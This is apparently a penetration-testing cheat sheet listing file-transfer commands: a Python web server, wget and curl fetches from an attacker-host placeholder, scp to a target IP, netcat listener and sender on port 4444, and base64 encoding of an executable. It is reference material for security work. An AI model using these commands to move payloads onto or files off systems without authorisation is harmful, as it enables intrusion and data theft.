```
python3 -m http.server 80
wget http://<LHOST>/file; curl http://<LHOST>/file -o file
scp file.txt user@<TARGET_IP>:/tmp/
# Netcat:
nc -lvnp 4444 > file          # receiver
nc <IP> 4444 < file           # sender
# Base64:
base64 -w0 file.exe; echo '<B64>' | base64 -d > file.exe
```